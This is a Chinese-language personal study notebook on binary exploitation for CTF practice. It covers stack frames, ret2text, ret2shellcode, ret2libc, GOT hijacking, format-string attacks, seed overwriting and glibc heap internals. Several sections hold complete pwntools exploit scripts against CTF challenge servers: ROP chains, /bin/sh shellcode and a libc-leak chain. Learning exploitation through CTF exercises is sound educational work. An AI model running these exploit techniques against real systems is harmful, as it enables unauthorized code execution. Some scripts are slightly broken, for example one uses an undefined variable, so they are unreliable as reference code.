# Pwn Notebook

###

### 学习参考文章

#### GDB的常见用法

https://blog.csdn.net/weixin\_62675330/article/details/122878315

```
ctrl c中断
pwndbg> vis 查看堆区

```

#### pwntools的基本用法

https://www.yuque.com/cyberangel/rg9gdm/uqazzg

安装LibcSearcher时使用报错

真的搞了好久md

```
打开libcSearcher目录下的libcdatabase
#删除libcdatabase里的文件
rm -rf *
#重新安装libcdatabase的东西
git clone https://github.com/niklasb/libc-database
./get ubuntu 
#出现报错Requirements for download or update ‘ubuntu’ are not met. Please, refer to README.md for installation instructions
#安装astd
sudo su 
apt-get install zstd
./get ubuntu

```

#### 动态链接plt和got表

https://blog.csdn.net/weixin\_62675330/article/details/122804591

我们在调用库函数时（以printf函数为例），汇编代码应该是：

```assembly
call **<printf函数的地址>**
```

但是问题是printf函数位于glibc动态库内，

文件在编译链接时并不知道动态库中printf函数的地址，

而现有的操作系统并不允许修改代码段，不能将printf函数地址在运行时修改到代码段，

只能把printf函数地址在运行时写到数据段内

```assembly
.text
...
// 调用printf的call指令
call printf_stub
...
printf_stub:
    mov rax, [printf函数的储存地址] // 获取printf重定位之后的地址
    jmp rax // 跳过去执行printf函数
.data
...
printf函数的储存地址：
　　这里储存printf函数重定位后的地址
```

### 网站工具

**在线汇编转换x86、x64**

https://defuse.ca/online-x86-assembler.htm，在搜索ROPgadget时有时搜索字符搜索不到，可以尝试搜索hex（syscall;ret--->0F05C3 ）

### 二进制基础

#### 程序的编译与链接

C语言代码 → 汇编代码 → 机器码

源代码 →编译(gcc编译器)→ 磁盘上得到可执行文件

#### ELF文件

​ ---Linux下的可执行文件格式

·ELF文件头表（ELF header） 记录了ELF文件的组织结构

·程序头表/段表（Program header table） 告诉系统如何创建进程 生成进程的可执行文件必须拥有此结构 重定位文件不一定需要

·节头表（Section header table） 记录了ELF文件的节区信息 用于链接的目标文件必须拥有此结构 其它类型目标文件不一定需要

磁盘中ELF文件和内存中的ELF（进程内存映像）

### 函数调用及函数栈帧相关知识

​ 查找ROPgadget、32位和64位的exp构造

#### 什么是栈

一种 **LIFO** （后进先出 last-in, first-out）形式的数据结构

栈支持两种基本的操作——push和pop

栈生长方向是**从高地址向低地址**

pop操作后并**没有清除该地址上的数据**，只是不能直接访问这个数据，在内容被覆盖前仍然是可以通过地址访问到该数据

#### 什么是栈帧

栈帧本质也是一种栈，只是专门用于保存函数调用过程中的各种信息（比如参数、返回地址等）

分为**栈顶**（栈最低地址处）和**栈底**（栈地址最高处）

x86中，用 **ebp** 指向栈底，**esp** 指向栈顶

![](F:%5CPWN%5C1596274083267-017f24ac-38ef-4813-8111-cf9cef1f9c71.png)

#### 函数调用栈原理

示例函数

```c++
int MyFunction(int x, int y, int z)
{
    int a, b, c;
    ...
    return;
}
int TestFunction()
{
    MyFunction1(1, 2, 3);
    ...
}
```

```assembly
_MyFunction:
    push ebp
    mov  ebp, esp
    ...
    mov esp, ebp
    pop ebp
    ret
```

可以看到调用MyFunction函数时会把 TestFunction函数——调用者函数的ebp和返回地址压入栈中，即调用者保存机制。

![](F:%5CPWN%5C1596274475794-6402472a-0a71-455d-9fb7-6afd586024b9.png)

函数返回时会把esp移到ebp处，弹出之前最开始保留的ebp的值到ebp寄存器，这样也就恢复栈的状态为调用之前的状态了

### 栈溢出原理

#### 寻找危险函数

通过寻找危险函数，我们快速确定程序是否可能有栈溢出，以及有的话，栈溢出的位置在哪里。常见的危险函数如下

* 输入
  * gets，直接读取一行，忽略'\x00'
  * scanf
  * vscanf
* 输出
  * sprintf
* 字符串
  * strcpy，字符串复制，遇到'\x00'停止
  * strcat，字符串拼接，遇到'\x00'停止
  * bcopy

#### 确定填充长度

这一部分主要是计算**我们所要操作的地址与我们所要覆盖的地址的距离**。常见的操作方法就是打开 IDA，根据其给定的地址计算偏移。一般变量会有以下几种索引模式

* 相对于栈基地址的的索引，可以直接通过查看 EBP 相对偏移获得
* 相对应栈顶指针的索引，一般需要进行调试，之后还是会转换到第一种类型。
* 直接地址索引，就相当于直接给定了地址。

一般来说，我们会有如下的覆盖需求

* **覆盖函数返回地址**，这时候就是直接看 EBP 即可。
* **覆盖栈上某个变量的内容**，这时候就需要更加精细的计算了。
* **覆盖 bss 段某个变量的内容**。
* 根据现实执行情况，覆盖特定的变量或地址的内容。

之所以我们想要覆盖某个地址，是因为我们想通过覆盖地址的方法来**直接或者间接地控制程序执行流程**。

### 基本ROP

#### ret2text

程序中有可以直接利用的完整的get shell代码如 return system("/bin/sh");

**例题：XCTF 4th-CyberEarth反应釜开关控制**

main函数：gets函数栈溢出

![](F:%5CPWN%5Cfyf.png)

控制返回到shell函数直接getshell

![](F:%5CPWN%5Cfyf2.png)

exp

```python
from pwn import *
#p = process("./pww")
p=remote('61.147.171.105',50870)

sys_ad =0x4005f6


payload='a'*(0x208)+p64(sys_ad)
p.sendline(payload)

p.interactive()
```

**例题2：攻防世界进阶区stack2**

常规checksec --file检查一下文件和保护，32位程序

IDA看一下反汇编，分析主函数的基本功能，程序是给一组数求平均，一开始要输入数字个数和一组数，看到一个后门函数

这题稍稍不一样，题目给的后门函数长这样：

```c
int hackhere()
{
  return system("/bin/bash");
}
```

/bin/bash也是我第一次见，百度了一下，相当于是管理员权限下的/bin/sh，但是连接靶机是没有bash权限的，所以我们能利用的只有 call system：

```
.text:080485B4                 call    _system
```

然后想办法**把"/bin/sh"作为参数传给system**函数，注意到bash中是有字符‘sh’的，所以我们使用一个断章取义的手段：

```python
#.rodata:08048980 command         db '/bin/bash',0        ; DATA XREF: hackhere+14↑o
#找到/bin/bash字符串位置，+7个字符就是sh的位置
# 0x08048980+7=0x08048987,"sh" in "/bin/bash"
```

#### ret2shellcode

NX保护不开启，查看bss和data段的权限——发现bss和data都可读可写可执行

pwndbg> vmmap LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA 0x400000 0x401000 r-xp 1000 0 /home/giantbranch/Desktop/chall 0x600000 0x601000 r-xp 1000 0 /home/giantbranch/Desktop/chall **0x601000 0x602000** **rwxp** 1000 1000 /home/giantbranch/Desktop/chall

readelf -S chall | grep bss \[26] .bss NOBITS 0000000000**601038** 00001038 readelf -S chall | grep data \[16] .rodata PROGBITS 0000000000400600 00000600 \[25] .data PROGBITS 0000000000**601028** 00001028

```
from pwn import *
context(arch='amd64',os="linux")
context.log_level = 'debug'

#sh=process("./chall")
sh=remote('43.248.98.206',10072)



shellcode=asm('''
mov rdi, 0x68732f6e69622f
push rdi
mov rdi,rsp
mov rsi,0
mov rdx,0
mov rax,0x3b
syscall
''')

jmp_rax=0x0000000000400485 #: jmp rax
payload=shellcode.ljust(0x38,'\x00')+p64(jmp_rax)

sh.sendline(payload)

sh.interactive()
```

#### ret2syscall

#### ret2libc

​ 原理：利用linux系统延迟绑定机制

​ GOT、PLT查看libc库函数地址

**攻防世界level3 WP——32位实例**

首先下载题目附件是个tar.gz文件——Linux下解压

```python
tar -zxvf +压缩文件名xxx.gz 
#解压xxx.gz到文件夹
```

解压后得到 “level3” 和 “libc\_32.so.6”两个文件

第一次实战遇到指定libc版本的题目，加载指定的libc版本的脚本语句为

```python
libc = ELF("./libc_32.so.6")
elf = ELF("./level3")
```

（发现好像加载了指定的libc以后由于版本不一样只能打远程，打本地还是使用自己的libc

惯例checksec一下，32位，开了NX，然后丢到ida里![20220727232730](https://f/PWN/20220727232730.png)

![20220727232702](https://f/PWN/20220727232702.png)

vulnerable\_function函数中，先调用write()再调用read()，那么在read()函数调用时已经存在write函数的plt和got表，其中函数read()存在栈溢出，思路是构造第一个payload控制函数进行write函数调用，打印出我们想要的write函数真实地址从而通过偏移泄露出libc版本，这样就能知道system函数的真实地址，那么就可以返回可利用函数再次利用栈溢出，构造payload2返回到system（“bin/sh”）get shell。

​ 总结利用的流程：read（控制返回地址调用write）——write（打印出write真实地址）——read（调用system）

接下来开始写exp

利用write函数和read函数首先要了解两个函数的参数：

write（参数1，参数2，参数3），write有三个参数，参数1 fd是模式，“1”为写模式，参数2在栈上其实是一个地址，它会将这个地址上存的字符串给打印出来，参数3是打印字符串的长度。

```c
ssize_t read(int fd, void * buf, size_t count);
ssize_t write(int fd, const void * buf, size_t count); 
```

同理read()会把参数fd所指的文件，传送count 个字节，到buf 指针所指的内存中。

\##payload1构造：

首先是填充，32位程序且ida中：

```
-00000088 buf             db ?
```

所以填充（0x88+4）个字节，然后是返回地址，我们想要控制调用write函数那么就是+p32(write\_plt)，然后构造write函数的栈：首先是返回地址，我们想要再次触发read栈溢出漏洞所以write完了返回main函数就行，那么+p32(main\_add)，接下来是write函数三个参数，第一个1固定的，第二个参数是我们想要打印的内存地址——write\_got这里面存放着write函数的真实地址，第三个参数是大小，因为是32位地址（4字节）所以填4。

那么到此第一个payload发送完了以后可以接收到write函数打印的真实地址write\_add =u32(p.recv()\[:4])

那么可以计算出libc的偏移然后知道system函数地址，接下来payload2构造就很简单了

填充（0x88+4）个字节，然后是返回地址——system函数地址，接下来是system函数返回地址（因为system执行后直接get shel所以随便填了），然后是bin/sh，好了，运行exp成功pwn，完整exp如下：

```python
from pwn import *

#p = process('./level3')
p = remote('61.147.171.105',60003)
libc = ELF("./libc_32.so.6")
elf = ELF("./level3")

libc_write = libc.symbols["write"]
libc_system = libc.symbols["system"]
libc_bin_sh = next(libc.search(b"/bin/sh\x00"))

write_plt =elf.plt["write"]
write_got =elf.got["write"]

main_add = 0x0804844B
payload1 = 'a'*(0x88+4)+p32(write_plt)+p32(main_add)+p32(1)+p32(write_got)+p32(4)

p.recvuntil(":\n")
p.sendline(payload1)

write_add =u32(p.recv()[:4])

libc_base = write_add - libc_write

payload2 = 'a'*(0x88+4) + p32(libc_base + libc_system)+p32(0)+p32(libc_base + libc_bin_sh)
p.recvuntil(":\n")
p.sendline(payload2)

p.interactive()

```

![20220727235624](https://f/PWN/20220727235624.png)

**64位实例**

还记得64和32位程序最大的区别吗——32是栈传递 64是寄存器调用

64位系统中使用寄存器传递参数（32bit是栈哦）

rdi、rsi、rdx、rcx、r8、r9(1-6个参数)

ubuntu64小心堆栈平衡！！！！！！！！！！！！！！！！！！！！！！！！！！！！

贴一个就看看就行的exp，原题。。。。。把萌新骗进来鲨呜呜呜

```python
from pwn import *
from LibcSearcher import*

context(arch="amd64",os="linux",log_level="debug")
#p = process('./checkin')
p= remote('pwn.challenge.ctf.show',28106)
libc= ELF("./libc-2.30.so")
elf= ELF("./checkin")

#ROPgadget --binary checkin | grep "pop rdi"
#0x0000000000401473 : pop rdi ; ret
add_poprdi=0x0000000000401473

puts_libc = libc.symbols['puts']
system_libc = libc.symbols['system']
binsh_libc = libc.search('/bin/sh').next()
print(hex(binsh_libc))
print(hex(system_libc))
main_addr=0x000000000040133A

puts_got = elf.got['puts']
puts_plt = elf.plt['puts']
payload = 'a'*(0x80+0x8)+p64(add_poprdi)+p64(puts_plt)+p64(puts_got)+p64(main_addr)

p.recvuntil("Please leave your name :")
p.sendline("Me")
p.recvuntil("Now, please tell us more about you to check in :")
p.sendline(payload)

puts_add = u64(p.recv()[:-1].ljust(8, b'\x00'))
print(hex(puts_add))
offset = puts_add - puts_libc
system_addr = system_libc + offset
binsh_addr = binsh_libc + offset

print(hex(offset))
print(hex(system_addr))
print(hex(binsh_addr))
payload2='a'*(0x80+0x8)
payload2 += p64(ret_addr) #0xaaaaa ret 堆栈平衡啊啊啊
payload2 += p64(add_poprdi)+p64(binsh_libc+1)+p64(system_libc+1)

p.recvuntil("Please leave your name :")
p.sendline("Me")
p.recvuntil("Now, please tell us more about you to check in :")
p.sendline(payload2)
#这个萌新还不知道 这个题的系统输出流被关了
#要侧信道攻击爆破flag
#这这这这叫签到题吗呜呜呜
p.interactive()
 
```

#### **ret2\_\_libc\_csu\_init**

**利用原理**

首先了解64位文件的传参方式——前六个参数，从左到右存放到寄存器rdi，rsi，rdx，rcx，r8，r9中，之后的参数依次放入栈中，这和32位程序一样。

### 例题：攻防世界Recho

劫持GOT表，将alarm got表劫持为syscall，然后调用read读取flag文件再print进行输出

exp：

```
from pwn import *
from LibcSearcher import *
context(arch='amd64',os="linux")
context.log_level = 'debug'

#p=process("../Recho")
p=remote("61.147.171.105",52887)
elf=ELF("../Recho")

flag_addr = 0x00601058

alarm_plt = elf.plt['alarm']
print("alarm plt:",hex(alarm_plt))
alarm_got = elf.got['alarm']
print("alarm got:",hex(alarm_got))
#@Dizzzzy:~/Desktop$ ROPgadget --binary Recho --only "pop|ret"
#Gadgets information
#============================================================
#0x000000000040089c : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
#0x000000000040089e : pop r13 ; pop r14 ; pop r15 ; ret
#0x00000000004008a0 : pop r14 ; pop r15 ; ret
#0x00000000004008a2 : pop r15 ; ret
#0x00000000004006fc : pop rax ; ret
#0x000000000040089b : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
#0x000000000040089f : pop rbp ; pop r14 ; pop r15 ; ret
#0x0000000000400690 : pop rbp ; ret
#0x00000000004008a3 : pop rdi ; ret
#0x00000000004006fe : pop rdx ; ret
#0x00000000004008a1 : pop rsi ; pop r15 ; ret
#0x000000000040089d : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret
#0x00000000004005b6 : ret

#@Dizzzzy:~/Desktop$ ROPgadget --binary Recho --only "add|ret"
#Gadgets information
#============================================================
#0x00000000004008af : add bl, dh ; ret
#0x00000000004008ad : add byte ptr [rax], al ; add bl, dh ; ret
#0x00000000004008ab : add byte ptr [rax], al ; add byte ptr [rax], al ; add bl, dh ; ret
#0x00000000004008ac : add byte ptr [rax], al ; add byte ptr [rax], al ; ret
#0x0000000000400830 : add byte ptr [rax], al ; add cl, cl ; ret
#0x00000000004008ae : add byte ptr [rax], al ; ret
#0x00000000004006f8 : add byte ptr [rcx], al ; ret
#0x000000000040070d : add byte ptr [rdi], al ; ret


pop_rdi_addr = 0x004008a3
pop_rsi_addr = 0x004008a1 # pop rsi ; pop r15 ; ret
pop_rax_addr = 0x004006fc
pop_rdx_addr = 0x004006fe
add_rdi_al_addr = 0x0040070d

p.recvuntil("Welcome to Recho server!\n")
p.sendline(str(0x200))

payload1 =  "a" * (0x30+8) 
#######change the got ADDR of ALARM to syscall
payload1 += p64(pop_rdi_addr).decode('unicode_escape')
payload1 += p64(alarm_got).decode('unicode_escape')#pop rdi
payload1 += p64(pop_rax_addr).decode('unicode_escape')
payload1 += p64(0x5).decode('unicode_escape')#pop rax
payload1 += p64(add_rdi_al_addr).decode('unicode_escape')#add [rdi],al

#########open("flag",READONLY);
#prototype of function:int open(const char *pathname, int flags);
#RAX:syscall name (#define __NR_open 2)
#RDI:Addr of filename str
#RSI:O_RDONLY
payload1 += p64(pop_rdi_addr).decode('unicode_escape')
payload1 += p64(flag_addr).decode('unicode_escape') #pop rdi
payload1 += p64(pop_rsi_addr).decode('unicode_escape')
payload1 += p64(0).decode('unicode_escape') #pop rsi
payload1 += p64(0).decode('unicode_escape') #pop r15
payload1 += p64(pop_rax_addr).decode('unicode_escape')
payload1 += p64(2).decode('unicode_escape') #pop rax
payload1 += p64(alarm_plt).decode('unicode_escape') #syscall

#########read(fd,bss_addr,100);
#RDI:fd
#RSI:bss_addr
#RDX:100
bss_addr = 0x00601070
read_plt = elf.plt['read']
print("read plt :",hex(read_plt))
payload1 += p64(pop_rdi_addr).decode('unicode_escape')
payload1 += p64(3).decode('unicode_escape') #pop rdi
payload1 += p64(pop_rsi_addr).decode('unicode_escape')
payload1 += p64(bss_addr).decode('unicode_escape') #pop rsi
payload1 += p64(0).decode('unicode_escape') #pop r15
payload1 += p64(pop_rdx_addr).decode('unicode_escape')
payload1 += p64(0x100).decode('unicode_escape') #pop rax
payload1 += p64(read_plt).decode('unicode_escape')

#########printf(buf);
#RDI:buf
printf_plt = elf.plt['printf']
print("printf plt:",hex(printf_plt))
payload1 += p64(pop_rdi_addr).decode('unicode_escape')
payload1 += p64(bss_addr).decode('unicode_escape') #pop rdi
payload1 += p64(printf_plt).decode('unicode_escape')
payload1 = payload1.ljust(0x200,'\x00')
p.sendline(payload1)
p.shutdown('write')
p.interactive()
```

<figure><img src="../.gitbook/assets/image (2) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>



### 格式化字符串漏洞

#### 格式化字符串格式

%\[parameter] \[flags] \[field width] \[.precision] \[ length] type

* parameter
  * n$，获取格式化字符串中的指定参数
* flag
* field width
  * 输出的最小宽度
* precision
  * 输出的最大长度
* length，输出的长度
  * hh，输出一个字节
  * h，输出一个双字节
* type
  * %d/i，有符号整数
  * %u，无符号整数
  * %x/X，16 进制 unsigned int 。x 使用小写字母；X 使用大写字母。如果指定了精度，则输出的数字不足时在左侧补 0。默认精度为 1。精度为 0 且值为 0，则输出为空。
  * %o，8 进制 unsigned int 。如果指定了精度，则输出的数字不足时在左侧补 0。默认精度为 1。精度为 0 且值为 0，则输出为空。
  * %s，如果没有用 l 标志，输出 null 结尾字符串直到精度规定的上限；如果没有指定精度，则输出所有字节。如果用了 l 标志，则对应函数参数指向 wchar\_t 型的数组，输出时把每个宽字符转化为多字节字符，相当于调用 wcrtomb 函数。
  * %c，如果没有用 l 标志，把 int 参数转为 unsigned char 型输出；如果用了 l 标志，把 wint\_t 参数转为包含两个元素的 wchart\_t 数组，其中第一个元素包含要输出的字符，第二个元素为 null 宽字符。
  * %p， void \* 型，输出对应变量的值。printf("%p",a) 用地址的格式打印变量 a 的值，printf("%p", \&a) 打印变量 a 所在的地址。
  * %n，不输出字符，但是把已经成功输出的字符个数写入对应的整型指针参数所指的变量。
  * %%， '`%`'字面值，不接受任何 flags, width。
  * _**特别注意%p可用于泄露内存地址，%n可用于修改变量的值**_

**例题 攻防世界String**

查看保护，除了pie都开了，64位程序。源码丢到ida以后人傻了，本蒟蒻没有遇到过这么长的源码啊啊啊啊啊，不慌先一步一步跟着代码走一下。

首先看main函数，题目直接打印了v4\[0]和v4\[1]地址

```c
*v4 = 68;
  v4[1] = 85;
  puts("we are wizard, we will give you hand, you can not defeat dragon by yourself ...");
  puts("we will tell you two secret ...");
  printf("secret[0] is %x\n", v4);
  printf("secret[1] is %x\n", v4 + 1);
  puts("do not tell anyone ");
  sub_400D72(v4);
```

然后走到了sub\_400D72()函数里，首先**第一个输入点**是输入玩家名，此处无利用点，程序对名字长度判断，输入不超过0xC就行，接下来进入sub\_400A7D()函数，里面有两个输入点，一次选择east/up,一次选择0/1,看了一遍没找到能利用的bug。到sub\_400BB9(); ！！好耶！发现一个格式化字符串漏洞,里面仍然是有两个输入点，那么第一个可利用的输入点是第五个输入点

![img](https://F:%5CPWN%5D7XFSC%7DEU8OH%6078C%5D@{2fnk.png)

emm但是要利用他干什么还不知道，继续读代码吧。接下来调用函数sub\_400CA6(a1); 注意这里的a1就是一开始main函数里打印给我们的v4\[0]，在函数sub\_400CA6(a1)里看到栈溢出那么可以注入shellcode进行ret2syscall，也就是第六个输入点也是我们要利用的

但是到漏洞的输入点出需要\*a1 == a1\[1]，也就是v4\[0] == v4\[1]],而一开始我们在main函数里看到

```c
  *v4 = 68;
  v4[1] = 85;
```

那么我们知道第一个格式化漏洞应该利用来修改二者的值让其相等，并且v4\[0]和v4\[1]地址已知，那么基本的思路就都有了。

完整exp，具体解法都写在注释里了

```python
from pwn import *
#p= process("./string")
p = remote('61.147.171.105',51646)
context(arch='amd64')
#这一句为了后面生成的是64位的shellcode

p.recvuntil("secret[0] is ")
v40_addr = int(p.recvuntil('\n'), 16)
p.recvuntil("secret[1] is ")
v41_addr = int(p.recvuntil('\n'), 16)
#接收到了v4[0] v4[1]的地址，利用格式化字符串漏洞可以把v4[0]改为85或者把v4[1]改成68
#这里用后者

p.sendlineafter("What should your character's name be:","hacker_n")
p.sendlineafter("So, where you will go?east or up?:","east")
p.sendlineafter("go into there(1), or leave(0)?:","1")

p.sendlineafter("'Give me an address'",str(int(v41_addr)))
#将v41_addr存放在了v2里


payload1='a'*68+'%7$n'
#这里+%7$n是因为我们将v41_addr存放在了v2里，而v2经过偏移计算是在栈中的第七个参数
#计算方法就是在程序运行时通过多次printf不断打印%p泄露内存的地址 从而看到偏移量
#这里再码一遍求偏移 学习参考文章：
#	https://blog.csdn.net/weixin_48066554/article/details/113747784
p.sendlineafter("And, you wish is:",payload1)

payload2=asm(shellcraft.sh())
p.sendlineafter("Wizard: I will help you! USE YOU SPELL",payload2)
p.interactive()
```



#### 格式化字符漏洞泄露canary

**格式化字符串漏洞原理**

在进入 printf 之后，函数首先获取第一个参数，一个一个读取其字符会遇到两种情况

* 当前字符不是 %，直接输出到相应标准输出。
* 当前字符是 %， 继续读取下一个字符
  * 如果没有字符，报错
  * 如果下一个字符是 %, 输出 %
  * 否则根据相应的字符，获取相应的参数，对其进行解析并输出

**利用漏洞**

​ 特别的，要注意格式化字符 “ **%n** ” ，它的功能是将 %n 之前打印出来的**字符个数**，赋值给一个变量

![](https://f/C/png/string_1.png)

比如在上面这段代码，看到通过格式化字符串“%n”成功修改了 变量a 的值

**例题 攻防世界CGfsbWP**

程序是32位ELF 文件保护：canary保护 NX保护

有后门函数

IDA伪代码：

![string\_2](https://f/C/png/string_2.png)

其中

```c
printf（&s）;
```

就是我们要利用的格式化字符串漏洞

阅读代码，目标是利用格式化字符串将pwnme修改为8

那么我们就需要pwnme的地址和printf函数参数的**偏移**：

求偏移 学习参考文章：

https://blog.csdn.net/weixin\_48066554/article/details/113747784

难点：计算canary距离buf数组的偏移：

```
首先找到canary的位于printf的第几个参数（本题为0xC），buf距离canary为0x70 - 0xC = 0x64字节，64位每8个字节一个地址，32位每四个字节一个地址0x64 / 0x4 = 25，再加上64位程序/32位程序传参方式，需要再加上6个寄存器，25 + 6 = 31，所以canary位于printf的第31个参数 用格式化输入字符“%31p”泄露canary的值
接受canary的值并以16进制存储：
canary=int(p.recvuntil("00"),16)

最后填充时payload如下：
a填充字符（0x70-0xC）+canary+canary距离返回地址的偏移（0xC）+返回地址

```

1. 查看pwnme地址

![string\_3](https://f/C/png/string_3.png)

2.通过多次printf不断打印%p泄露内存的地址 从而看到偏移量

aaaa-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p

![string\_5](https://f/C/png/string_5.png)

最后写exp 在绕过了无用的输入后到达可以利用点然后输入payload，成功pwn\~

payload构造时注意：使pwnme的值为8要求在%10$n之前有8字符内容，32地址是4字节所以要再填充 8-4=4个字符（此处用a）

![string\_4](https://f/C/png/string_4.png)

### 伪随机数绕过

刷到了一些伪随机数绕过题目，题目程序一般是个猜数游戏，连续多次（比如下面例题50次）猜对随机数就会print flag给我们，这种题目思路是利用srand函数其实是生成伪随机数（相同的种子下生成的随机数是固定的）来进行绕过——先覆盖种子为固定已知值，然后就可以绕过随机数了。

#### 例题1 攻防世界dice\_game （XCTF 4th-QCTF 2018）

源程序分析：![discgame1](F:%5CPWN%5Cdiscgame1.png)

看到连续让v5等于0 50次就会运行sub\_B28()函数：输出flag

![discgame3](F:%5CPWN%5Cdiscgame3.png)

而v5函数是由sub\_A20()函数赋值：![discgame2](F:%5CPWN%5Cdiscgame2.png)

在函数中可以看到要让v5等于0必须猜中随机数，分析主函数中存在栈溢出点，我们想要绕过随机数就要覆盖让seed为固定值（比如1），从buf到seed偏移量是（0x50-0x10）![discgame4](F:%5CPWN%5Cdiscgame4.png)

那么第一个覆盖seed的payload就有了—— ‘a’\*（0x50-0x10）+ p64(1)

接下来就是生成出那50个伪随机数并一一输入就可以打通了，exp如下：

```python
from pwn import *
from ctypes import *
#ctypes是Python内建的用于调用动态链接库函数的功能模块，rand函数要用cdll中的函数。

p=remote('61.147.171.105',56061)
context(arch="amd64",os="linux")
libc = cdll.LoadLibrary("/lib/x86_64-linux-gnu/libc.so.6")
#加载指定版本libc文件


p.recvuntil('Welcome, let me know your name: ')
seedpayload='a'*0x40+p64(1)
p.sendline(seedpayload)#覆盖种子为1

libc.srand(1)

#设置种子为1进行伪随机数生成，
#也可以用下面这段C代码进行生成，但需要注意的是在Linux下和windows下生成的随机数是不一样的,一定要在相同环境下运行生成的伪随机数才一样
#	#include<stdio.h>
#	#include<stdlib.h>
#	int main()
#	{
#		int i,x;
#		srand(1);
#		for(i=0;i<=50;i++)
#		{
#			x = rand() % 6 + 1;
#			printf("%d\n",x);	
#		}
#		return 0;
#	}

for i in range(50):
	num=str(libc.rand()%6+1)
	p.sendlineafter("point(1~6):",num)

p.interactive()
```

运行exp就可以get flag![discgamepwn](F:%5CPWN%5Cdiscgamepwn.png)

#### 例题2 攻防世界guess\_num

### 堆溢出原理——动态内存管理malloc、free实现方法掌握堆溢出利用方法

·堆概述

·堆相关的数据结构——堆块malloc\_chunk & bin

·堆块的结构

bin双向链表，unlink从bin中取出要求的堆块元素：

```c++
/* Take a chunk off a bin list */
// unlink p
#define unlink(AV, P, BK, FD) {                                            \
    // 由于 P 已经在双向链表中，所以有两个地方记录其大小，所以检查一下其大小是否一致。
    if (__builtin_expect (chunksize(P) != prev_size (next_chunk(P)), 0))      \
      malloc_printerr ("corrupted size vs. prev_size");               \
    FD = P->fd;                                                                      \
    BK = P->bk;                                                                      \
    // 防止攻击者简单篡改空闲的 chunk 的 fd 与 bk 来实现任意写的效果。
    if (__builtin_expect (FD->bk != P || BK->fd != P, 0))                      \
      malloc_printerr (check_action, "corrupted double-linked list", P, AV);  \
    else {                                                                      \
        FD->bk = BK;                                                              \
        BK->fd = FD;                                                              \
        // 下面主要考虑 P 对应的 nextsize 双向链表的修改
        if (!in_smallbin_range (chunksize_nomask (P))                              \
            // 如果P->fd_nextsize为 NULL，表明 P 未插入到 nextsize 链表中。
            // 那么其实也就没有必要对 nextsize 字段进行修改了。
            // 这里没有去判断 bk_nextsize 字段，可能会出问题。
            && __builtin_expect (P->fd_nextsize != NULL, 0)) {                      \
            // 类似于小的 chunk 的检查思路
            if (__builtin_expect (P->fd_nextsize->bk_nextsize != P, 0)              \
                || __builtin_expect (P->bk_nextsize->fd_nextsize != P, 0))    \
              malloc_printerr (check_action,                                      \
                               "corrupted double-linked list (not small)",    \
                               P, AV);                                              \
            // 这里说明 P 已经在 nextsize 链表中了。
            // 如果 FD 没有在 nextsize 链表中
            if (FD->fd_nextsize == NULL) {                                      \
                // 如果 nextsize 串起来的双链表只有 P 本身，那就直接拿走 P
                // 令 FD 为 nextsize 串起来的
                if (P->fd_nextsize == P)                                      \
                  FD->fd_nextsize = FD->bk_nextsize = FD;                      \
                else {                                                              \
                // 否则我们需要将 FD 插入到 nextsize 形成的双链表中
                    FD->fd_nextsize = P->fd_nextsize;                              \
                    FD->bk_nextsize = P->bk_nextsize;                              \
                    P->fd_nextsize->bk_nextsize = FD;                              \
                    P->bk_nextsize->fd_nextsize = FD;                              \
                  }                                                              \
              } else {                                                              \
                // 如果在的话，直接拿走即可
                P->fd_nextsize->bk_nextsize = P->bk_nextsize;                      \
                P->bk_nextsize->fd_nextsize = P->fd_nextsize;                      \
              }                                                                      \
          }                                                                      \
      }                                                                              \
}
```

fast bins，small bins，large bins，unsorted bin

**Fastbins**

“special bins that hold returned chunks without consolidating their spaces”——HeapLab

保存返回的块而不合并其空间的特殊bin

特点：单链接的非循环列表的集合，每个列表包含特定大小的自由块，sizes 0x20 through 0xb0，LIFO结构![](F:%5CPWN%5Cfastbin1.png)

**Top chunk**

“最顶部的可用块，即接近可用内存末端的块”

当顶部块太小，无法服务于低于mmap阈值的请求时，malloc尝试通过 sysmalloc()函数扩展Top chunk

Malloc使用其大小字段跟踪Top chunk中的剩余内存，并始终设置其中的prev\_inuse位。Top chunk总是包含足够的内存来分配一个最小大小的块，并且总是以页面边界结束

**Unsortedbin**

一个双链接的循环列表，包含任意大小的自由块

![unsortbin](F:%5CPWN%5Cunsortbin.png)

**Smallbin**

双链接的循环列表，每个列表中都有特定大小的自由块

大小为0x20到0x3f0的自由块可存入Smallbin

FIFO 结构

**Largebins**

双链接的循环列表的集合，每个列表都包含一个大小范围内的自由块

Largebins按大小降序保持，最大的块可以通过bin的fd指针访问，而最小的块可以通过它的bk访问

**Remaindering**

malloc提供的术语，即将一个自由块分成两个更小的块，然后分配适当的块。其余的块被链接到属于该块的 arena 的未排序的bin中

**Malloc Parameters**

```c
struct malloc_par {
	/* Tunable parameters. */
	unsigned long trim_threshold;
	INTERNAL_SIZE_T top_pad;
	INTERNAL_SIZE_T mmap_threshold;
	INTERNAL_SIZE_T arena_test;
	INTERNAL_SIZE_T arena_max;
	/* Memory map support. */
	int n_mmaps;
	int n_mmaps_max;
	int max_n_mmaps;
	/* The mmap_threshold is dynamic, until the user sets it manually, at which point we need to disable any dynamic behaviour. */
int no_dyn_threshold;
	/* Statistics. */
	INTERNAL_SIZE_T mmapped_mem;
	INTERNAL_SIZE_T max_mmapped_mem;
	/* First address handed out by MORECORE/sbrk. */
	char* sbrk_base;
#if USE_TCACHE
	/* Maximum number of buckets to use. */
	size_t tcache_bins;
	size_t tcache_max_bytes;
	/* Maximum number of chunks in each bucket. */
	size_t tcache_count;
	/* Maximum number of chunks to remove from the unsorted list, whicharen't used to prefill the cache. */
	size_t tcache_unsorted_limit;
#endif
};
```

**Tcache**

在GLIBC versions >= 2.26中才有，tcache的行为类似arena，但与arena不同，tcache不会在线程之间共享。设计目的：缓解malloc资源的线程争用

**UAF**

即use after free

**例题 攻防世界hacknote**

首先是源码分析：看到是一个有着增删查功能的结点表

检查保护发现有canary保护和NX保护，32位

![](F:%5CPWN%5Chacknote1.png)

ida中查看，主函数就不看了就是一个choice的选择分支，主要看我们可以利用的函数——增，删，查函数

![hacknote2](F:%5CPWN%5Chacknote2.png)

![hacknote3](F:%5CPWN%5Chacknote3.png)

![hacknote4](F:%5CPWN%5Chacknote4.png)

